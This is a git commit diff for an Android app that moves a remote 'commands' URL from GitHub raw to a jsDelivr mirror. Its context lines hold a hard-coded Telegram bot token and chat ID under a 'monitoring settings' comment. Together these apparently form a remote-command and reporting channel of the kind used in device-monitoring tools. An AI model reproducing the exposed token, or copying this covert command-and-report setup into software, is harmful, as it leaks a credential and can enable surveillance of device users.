078c2af910951f800eaa783efc84544f893bb70b
abdullah14120 <abdullah.tamemii@gmail.com>
2026-04-18 02:41:45 +0300

    Update SecondActivity.java

--- app/src/main/java/com/ban/ab/SecondActivity.java
+++ app/src/main/java/com/ban/ab/SecondActivity.java
@@ -32,7 +32,8 @@ public class SecondActivity extends AppCompatActivity {
     private Runnable refreshRunnable;
 
     // --- إعدادات المراقبة ---
-    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/refs/heads/main/commands/";
+    // الرابط الجديد بدلاً من القديم
+private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
 
